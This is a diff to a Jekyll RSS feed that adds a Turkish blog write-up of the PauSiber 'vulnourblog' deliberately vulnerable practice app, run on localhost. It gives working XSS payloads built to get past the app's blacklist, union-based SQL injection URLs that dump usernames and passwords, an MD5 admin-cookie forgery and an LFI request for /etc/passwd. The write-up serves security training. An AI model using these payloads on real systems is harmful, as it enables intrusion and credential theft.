@@ -2,12 +2,173 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts</title>
-    <description>My Personal Posts</description>
+    <description>Alp Eren Işık</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/sitemap.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 29 Jul 2019 16:56:50 +0300</pubDate>
-    <lastBuildDate>Mon, 29 Jul 2019 16:56:50 +0300</lastBuildDate>
+    <pubDate>Wed, 31 Jul 2019 01:27:06 +0300</pubDate>
+    <lastBuildDate>Wed, 31 Jul 2019 01:27:06 +0300</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>PauSiber Vulnourblog WRITEUP</title>
+        <description>&lt;hr /&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://pausiber.xyz&quot;&gt;PauSiber&lt;/a&gt; tarafından hazırlanan &lt;strong&gt;Vulnerable Blog Application&lt;/strong&gt; için öncelikli olarak ekip arkadaşlarıma teşekkür ederim. İçerisinde &lt;a href=&quot;https://www.owasp.org&quot;&gt;OWASP&lt;/a&gt; tarafından kabul görmüş popüler web zafiyetleri yer almaktadır. Dilerseniz yazıyı okumadan önce &lt;a href=&quot;https://github.com/PauSiber/vulnourblog&quot;&gt;BURAYA&lt;/a&gt; tıklayarak sizlerde bu zafiyetli web uygulamasını kurcalayabilirsiniz.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;reflected-xss&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Reflected XSS&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;Search kısmında &lt;strong&gt;Reflected XSS&lt;/strong&gt; olabileceğini düşündüğümden kontrol etmeye karar verdim.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/reflected-xss-1.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Öncelikli olarak sayfa kaynağını görüntüleyerek XSS arayacağımız input kısmında herhangi bir kontrol olup olmadığına bakacağım.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/reflected-xss-2.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Gördüğünüz gibi gönderdiğimiz değer &lt;strong&gt;s_result.php&lt;/strong&gt;‘ye gidiyor. Sayfamız açık kaynak kodlu olduğu için daha hızlı sonuç alacağımı düşünerek s_result.php’nin kaynak koduna bakmaya karar verdim.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/reflected-xss-3.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kaynak kodda gördüğüm &lt;strong&gt;searchPageDom($_GET[“key”])&lt;/strong&gt; dikkatimi çekti. &lt;strong&gt;s_result.php&lt;/strong&gt; içerisinde böyle bir özellik olmadığı için &lt;strong&gt;header.php&lt;/strong&gt;‘ye bakmaya karar verdim ve dikkatimi &lt;strong&gt;settings.php ile functions.php&lt;/strong&gt; çekti. Aradığım fonksiyonun &lt;strong&gt;functions.php&lt;/strong&gt;‘de olma olasılığı yüksek olduğundan hemen &lt;strong&gt;functions.php&lt;/strong&gt;‘nin kaynak koduna bakmaya başladım.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/reflected-xss-4.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve sonuç olarak engellenmiş olan kelimeleri bulduk. Artık buna göre payloadımızı hazırlayabiliriz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&amp;gt;&amp;lt;/object&amp;gt;   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/reflected-xss-5.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/base64.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;stored-xss&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Stored XSS&lt;/code&gt;&lt;/h1&gt;
+
+&lt;p&gt;Hazır XSS ile başlamışken bir de yazıların altında bulunan yorum bölümünde &lt;strong&gt;Stored XSS&lt;/strong&gt; var mı diye kontrol edelim.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/stored-xss-1.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Form yapısında kontrol var mı diye kontrol ediyorum. İlk başta &lt;strong&gt;id=”comment”&lt;/strong&gt; dikkatimi çekiyor. Daha sonra kaynak kodun altında yer alan &lt;strong&gt;js/post.js&lt;/strong&gt; dosyası dikkatimi çekiyor ve kontrol işlemini yapan özelliğin bu dosyada olduğunu düşünerek açıp incelemeye karar veriyorum.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/stored-xss-2.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve bingo! Gördüğünüz gibi bir blacklist oluşturulmuş. Artık hangi ifadelerin engelli olduğunu bildiğimize göre uygun payloadımızı hazırlayabiliriz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoIlBhdVNpYmVyIik+&amp;gt;&amp;lt;/object&amp;gt;   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/stored-xss-3.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/stored-xss-4.png&quot; alt=&quot;xss&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;sql-injection&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SQL Injection&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;Kategorilere ait yazıların listelendiği bölümde &lt;strong&gt;sql injection&lt;/strong&gt; olabileceğini düşünerek bi tırnak attım ve sayfa gitti :). Devamında &lt;strong&gt;order by&lt;/strong&gt; ile 7 adet kolonumuz olduğunu öğreniyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-1.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Daha sonra &lt;strong&gt;union select 1,2,3,4,5,6,7&lt;/strong&gt; yazarak ekrana hangi sayıları bastığını göreceğiz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-2.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Gördüğünüz gibi 3 ve 4’ü ekrana bastı. Artık sorgumuzda 3. veya 4. kolonun olduğu kısımları kullanarak ilgili dataları çekebiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-3.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Öncelikli olarak veritabanı adını öğrendik. Daha sonra tablo isimlerini çekeceğiz. Burada &lt;strong&gt;table_schema=database()&lt;/strong&gt; yerine &lt;strong&gt;table_schema=”cypwn_vulnourblog”&lt;/strong&gt; da yazabilirsiniz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost/vulnourblog/category.php?id=3 union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema=&quot;cypwn_vulnourblog&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-4.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Şimdi tablo isimlerini öğrendiğimize göre ilgili tablonun kolon isimlerini öğrenebiliriz. Burada bizim için önemli olan &lt;strong&gt;user&lt;/strong&gt; tablosudur.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost/vulnourblog/category.php?id=3 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name=&quot;users&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-5.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Şimdi bizim için önemli olan &lt;strong&gt;username&lt;/strong&gt; ve &lt;strong&gt;password&lt;/strong&gt; bilgilerini çekeceğiz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost/vulnourblog/category.php?id=3 union select 1,2,group_concat(username,0x3a,password),4,5,6,7 from users
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-6.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Evet gördüğünüz gibi admin bilgilerini çekmiş olduk. &lt;strong&gt;http://localhost/vulnourblog/admin/login/&lt;/strong&gt; adresine giderek giriş yapabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;Kaynak Kod :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-7.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ayrıca sizlere yardımcı olması açısından ufak ipuçlarını da kaynak kodlarda görebilirsiniz :)&lt;/p&gt;
+
+&lt;p&gt;Bunun dışında &lt;strong&gt;post.php&lt;/strong&gt;‘de de &lt;strong&gt;sql injection&lt;/strong&gt; zafiyeti bulunmaktadır.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-8.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost/vulnourblog/post.php?id=3 or true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-9.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost/vulnourblog/post.php?id=3 union select 1,2,3,group_concat(username,0x3a,password),5,6 from users
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-10.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kaynak Kod :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-11.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Son olarak admin panelinde yer alan yorum silme bölümünde de &lt;strong&gt;sql injection&lt;/strong&gt; zafiyeti bulunmaktadır.&lt;/p&gt;
+
+&lt;p&gt;Kaynak Kod :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/sqli-12.png&quot; alt=&quot;sql_injection&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;admin-login&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Admin Login&lt;/code&gt;&lt;/h1&gt;
+
+&lt;p&gt;Öncelikli olarak &lt;strong&gt;sql injection&lt;/strong&gt; zafiyetinde görmüş olduğumuz gibi adminin &lt;strong&gt;kullanıcı adı ve parolasının&lt;/strong&gt; tahmin edilmesi çok kolay. Bu yüzden basit bir brute force saldırısı ile admin paneline giriş yapabiliriz.&lt;/p&gt;
+
+&lt;p&gt;Diğer yolu ise öncelikli olarak tarayıcımıza cookie yönetimi yapabileceğimiz bir eklenti kurmaktan geçiyor. Daha sonra &lt;strong&gt;http://localhost/vulnourblog/admin/login/&lt;/strong&gt; adresine gidip bu eklentimiz ile cookie değerimizi kontrol ediyoruz.  &lt;strong&gt;isadmin&lt;/strong&gt; yazısını ve bize atamış olduğu cookie değerini &lt;strong&gt;cfcd208495d565ef66e7dff9f98764da&lt;/strong&gt; olarak göreceksiniz. Bu değeri &lt;strong&gt;MD5&lt;/strong&gt; ile decrypt(şifre çözme) ederseniz değerin 0 geldiğini göreceksiniz. O halde &lt;strong&gt;Md5(1) = c4ca4238a0b923820dcc509a6f75849b&lt;/strong&gt; değerini cookie değeri olarak almayı deneyelim :).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/cookie.jpg&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Daha sonra &lt;strong&gt;http://localhost/vulnourblog/admin/&lt;/strong&gt; URL’ine gittiğimizde admin olarak giriş yapmış olacağız.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/admin.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kaynak Kod :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/cookie-3.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/cookie-2.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;file-upload&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;File Upload&lt;/code&gt;&lt;/h1&gt;
+
+&lt;p&gt;Admin panelinde yazı ekleme bölümünde &lt;strong&gt;File Upload&lt;/strong&gt; zafiyeti var. Yaklaşık 1,5 sene önce bu siteyle ilk uğraştığım zamanlarda içeriye güzel bir shell atıp veritabanındaki bütün verileri silmiştim. Ancak şuan bazı teknik aksaklıklardan dolayı bu kısmı gösteremiyeceğim. Zafiyetli kod aşşağıda yer almaktadır. Temel mantığı &lt;strong&gt;DVWA File Upload – Medium Level&lt;/strong&gt; ile aynıdır.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/PauSiber/vulnourblog/blob/master/admin/yaziekle.php&quot;&gt;Zafiyetli Kod&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;local-file-inclusion-lfi&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Local File Inclusion (LFI)&lt;/code&gt;&lt;/h1&gt;
+
+&lt;p&gt;Admin panelinde gezinirken aklıma acaba burda &lt;strong&gt;lfi&lt;/strong&gt; var mıdır sorusu geldi ve sonuç.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost/vulnourblog/admin/index.php?page=/etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/vulnourblog/lfi.png&quot; alt=&quot;lfi&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 31 Jul 2019 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/2019/07/31/pausiber_vulnourblog.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/07/31/pausiber_vulnourblog.html</guid>
+        
+        
+        <category>writeup</category>
+        
+      </item>
     
       <item>
         <title>Lock Picking Nedir ?</title>
